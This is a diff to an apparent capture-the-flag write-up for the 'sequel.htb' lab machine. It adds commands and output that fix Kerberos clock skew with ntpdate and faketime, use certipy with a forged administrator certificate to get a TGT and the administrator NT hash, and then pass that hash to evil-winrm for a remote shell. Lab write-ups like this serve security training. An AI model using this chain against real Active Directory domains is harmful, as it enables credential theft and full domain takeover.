@@ -319,5 +319,23 @@ need to synchronize our clock to the time of the remote machine before we can pr
 Then you can transform the generated certificate to `.pfx` format and use it to authenticate using Rubeus or certipy again:
 
 ```bash
+sudo ntpdate -u sequel.htb
+2023-11-17 23:33:48.667895 (+1300) +28799.884939 +/- 0.066782 sequel.htb 10.10.11.202 s1 no-leap
+CLOCK: time stepped by 28799.884939
+
 certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'sequel.htb' -dc-ip $IP
+
+faketime '2023-11-17 23:33:48' certipy auth -pfx 'administrator.pfx'
+
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+[*] Using principal: administrator@sequel.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
+
+evil-winrm -i $IP -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
 ```
+
+`faketime` save the day!
